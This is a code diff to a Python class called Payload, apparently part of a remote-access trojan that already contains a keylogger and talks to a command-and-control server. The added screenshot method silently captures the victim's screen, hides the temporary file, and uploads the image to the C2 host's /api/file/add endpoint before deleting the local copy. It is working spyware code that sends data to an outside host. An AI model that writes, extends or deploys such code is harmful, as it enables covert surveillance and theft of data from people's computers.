@@ -9,6 +9,7 @@ import os
 import requests
 import hashlib
 from pynput.keyboard import Listener
+import pyautogui
 
 class Payload():
     def __init__(self, host='0.0.0.0', port=1337, **kwargs):
@@ -175,7 +176,25 @@ class Payload():
                     return "Error reading log file or no log file found"
             else:
                 return "Keylogger is still running, please end it first"
-            
+           
+           
+    def screenshot(self):
+        file = "./screen.png"
+        
+        try:
+            screenshot = pyautogui.screenshot()
+            screenshot.save(file)
+            os.system(f'attrib +h "{file}"')
+            with open(file, 'rb') as f:
+                ss = f.read()
+            os.remove(file)
+            data = {'owner': self.owner, 'type': 'png', "module": self.screenshot.__name__, "session": self.info.get('uid')}
+            files = {'file': (file, ss)}
+            requests.post(f'http://{self.c2[0]}:5000/api/file/add', data=data, files=files)
+            return 'Screenshot upload completed'
+        except Exception as e:
+            log(f"Error: {e}", level='error')
+            return "Error taking screenshot"
             
     def send_task_result(self, task):
         try:
